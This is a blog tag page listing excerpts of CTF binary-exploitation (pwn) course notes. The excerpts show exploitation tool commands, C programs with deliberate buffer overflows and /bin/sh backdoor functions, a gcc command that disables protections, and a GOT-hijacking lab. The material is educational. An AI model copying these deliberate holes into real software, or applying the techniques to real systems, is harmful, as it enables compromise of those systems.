</span></span><span style=display:flex><span>$ ROPgadget --binary <span style=color:#f92672>{</span>executed file<span style=color:#f92672>}</span> --string <span style=color:#e6db74>&#34;/bin/sh&#34;</span>
</span></span></code></pre></div></li><li><a href=https://github.com/david942j/one_gadget>one_gadget</a><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo apt install rubygems
</span></span><span style=display:flex><span>$ sudo gem install one_gadget
</span></span><span style=display:flex><span>$ one_gadget <span style=color:#f92672>{</span>libc file<span style=color:#f92672>}</span>
</span></span></code></pre></div></li><li>seccomp-tools<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo apt install gcc ruby-dev
</span></span><span style=display:flex><span>$ gem install seccomp-tools
</span></span><span style=display:flex><span>$ seccomp-tools dump ./test
</span></span></code></pre></div></li><li>找glibc版本的online tool
<a href=https://libc.rip/>libc-database search API Search</a>
<a href="https://libc.blukat.me/?q=__libc_start_main_ret">libc database search</a></li></ul></li></ul><h3 id=gdb>gdb
<a class=anchor href=#gdb>#</a></h3><p>:::spoiler 常用語法(<a href=https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf>cheat</a>)</p><a href=/tools/ctf/pwn-overview/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/>Simple Buffer Overflow - 0x00</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/ntustisc/>NTUSTISC</a></div><p><h1 id=simple-buffer-overflow---0x00>Simple Buffer Overflow - 0x00
<a class=anchor href=#simple-buffer-overflow---0x00>#</a></h1><h6 id=tags-ctf-pwn>tags: <code>CTF</code> <code>PWN</code>
<a class=anchor href=#tags-ctf-pwn>#</a></h6><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int main()
{
    char buf[0x10];
    read(0, buf, 0x30); // It&#39;ll read the value that you input and store in buf with length=0x30
    system(&#34;pause&#34;);
    return 0;
}
</code></pre><ul><li>Note that you can check <a href=https://www.dotcpp.com/course/460>this page</a> to know more about <code>read</code> function</li></ul><h2 id=dynamic-analysis---x32dbg>Dynamic Analysis - <code>x32dbg</code>
<a class=anchor href=#dynamic-analysis---x32dbg>#</a></h2><ul><li><p>This is the original entry point of this program.
<img src=https://imgur.com/DWOL9Hy.png alt></p><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/>Simple Buffer Overflow - 0x01</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/ntustisc/>NTUSTISC</a></div><p><h1 id=simple-buffer-overflow---0x01>Simple Buffer Overflow - 0x01
<a class=anchor href=#simple-buffer-overflow---0x01>#</a></h1><h6 id=tags-ctf-pwn>tags: <code>CTF</code> <code>PWN</code>
<a class=anchor href=#tags-ctf-pwn>#</a></h6><p>Follow the concept of lecture <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/SJAt7Pd5s>0x00</a></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void y0u_c4n7_533_m3()
{
    execve(&#34;/bin/sh&#34;, (char *[]){0}, (char *[]){0});
}

int main()
{
    char buf[16];
    puts(&#34;This is your first bof challenge ;)&#34;);
    fflush(stdout);
    read(0, buf, 0x30);
    system(&#34;pause&#34;);
    return 0;
}
</code></pre><p>The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
We can check <code>bof</code> in the main function that it read the string with length <code>0x30</code> that bigger than <code>buf</code> size.</p><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/>Simple Buffer Overflow - 0x02</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/ntustisc/>NTUSTISC</a></div><p><h1 id=simple-buffer-overflow---0x02>Simple Buffer Overflow - 0x02
<a class=anchor href=#simple-buffer-overflow---0x02>#</a></h1><h6 id=tags-ctf-pwn>tags: <code>CTF</code> <code>PWN</code>
<a class=anchor href=#tags-ctf-pwn>#</a></h6><h2 id=why-wed-like-to-create-shellcode>Why we&rsquo;d like to create shellcode?
<a class=anchor href=#why-wed-like-to-create-shellcode>#</a></h2><p>In pwn problem, most of the program don&rsquo;t have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use <code>bof</code> to overlap the original address by shellcode address. Then we can take the shell.</p><h2 id=how-to-create-a-shellcode-in-bof>How to create a shellcode in BOF?
<a class=anchor href=#how-to-create-a-shellcode-in-bof>#</a></h2><p>In lecture <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs>0x01</a>, we can see sub-function that create a shell using command:</p><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/>Simple Buffer Overflow - 0x04</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/ntustisc/>NTUSTISC</a></div><p><h1 id=simple-buffer-overflow---0x04>Simple Buffer Overflow - 0x04
<a class=anchor href=#simple-buffer-overflow---0x04>#</a></h1><h6 id=tags-ctf-pwn>tags: <code>CTF</code> <code>PWN</code>
<a class=anchor href=#tags-ctf-pwn>#</a></h6><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-clike! data-lang=clike!>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

char message[48];

int main()
{
    char name[16];
    printf(&#34;Give me your message: &#34;);
    fflush(stdout);
    read(0, message, 0x30);
    fflush(stdout);
    read(0, name, 0x30);
    return 0;
}
</code></pre><ul><li><p>Actually, this is a variant of the <a href=https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs>lecture 0x01</a></p></li><li><p><font color=F0000>Note that</font>, the global variable has its own address, instead of local variable that push to stack that we don&rsquo;t know at first.</p><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/>Simple Buffer Overflow - 0x05(Leak Canary)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-buffer-overflow---0x05leak-canary>Simple Buffer Overflow - 0x05(Leak Canary)
<a class=anchor href=#simple-buffer-overflow---0x05leak-canary>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=canary-background>Canary Background
<a class=anchor href=#canary-background>#</a></h2><p><img src=https://imgur.com/onxC8Aq.png alt></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-clike! data-lang=clike!>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

void backdoor()
{
    system(&#34;/bin/sh&#34;);
}

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char name[0x10];
    char phone[0x10];

    printf(&#34;What&#39;s your name: &#34;);
    read(0, name, 0x100);
    printf(&#34;Hello, %s !&#34;, name);

    printf(&#34;What&#39;s your phone number: &#34;);
    read(0, phone, 0x100);

    return 0;
}
</code></pre><ul><li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use <code>checksec</code> to observe the protection<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro
</code></pre><img src=https://imgur.com/u5iueTC.png alt></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ul><li><p>First, we can use <code>objdump -d -M Intel {filename}</code> to check the address of backdoor → <code>0x4011b6</code>
<img src=https://imgur.com/d30qIvL.png alt></p><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-pwn---0x06got-hijackinglab---got2win>Simple PWN - 0x06(GOT hijacking/Lab - <code>got2win</code>)
<a class=anchor href=#simple-pwn---0x06got-hijackinglab---got2win>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><p>challenge: <code>nc edu-ctf.zoolab.org 10004</code></p><h2 id=got-background>GOT Background
<a class=anchor href=#got-background>#</a></h2><p><a href="https://youtu.be/ktoVQB99Gj4?t=4423">Lecture Vid. - Pwn week1</a>
<a href="https://youtu.be/PBgHHWtjtFA?t=6017">NTUSTISC - Pwn Basic 2 [2019.03.19]</a></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><p>:::spoiler Original Code</p><pre tabindex=0><code class="language-cpp!=" data-lang="cpp!=">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

char flag[0x30];

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    int fd = open(&#34;/home/chal/flag&#34;, O_RDONLY);
    read(fd, flag, 0x30);
    close(fd);
    write(1, &#34;Good luck !\n&#34;, 13);

    unsigned long addr = 0;
    printf(&#34;Overwrite addr: &#34;);
    scanf(&#34;%lu&#34;, &amp;addr);
    printf(&#34;Overwrite 8 bytes value: &#34;);
    read(0, (void *) addr, 0x8);

    printf(&#34;Give me fake flag: &#34;);
    int nr = read(1, flag, 0x30);
    if (nr &lt;= 0)
        exit(1);
    flag[nr - 1] = &#39;\0&#39;;
    printf(&#34;This is your flag: ctf{%s}... Just kidding :)\n&#34;, flag);

    return 0;
}
</code></pre><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/pwn/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/pwn/page/2/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/pwn/ aria-label="Page 1" class=page-link role=button>1</a></li><li class=page-item><a href=/tags/pwn/page/2/ aria-label="Page 2" class=page-link role=button>2</a></li><li class="page-item active"><a aria-current=page aria-label="Page 3" class=page-link role=button>3</a></li><li class=page-item><a href=/tags/pwn/page/4/ aria-label="Page 4" class=page-link role=button>4</a></li><li class=page-item><a href=/tags/pwn/page/5/ aria-label="Page 5" class=page-link role=button>5</a></li><li class=page-item><a href=/tags/pwn/page/4/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/pwn/page/6/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>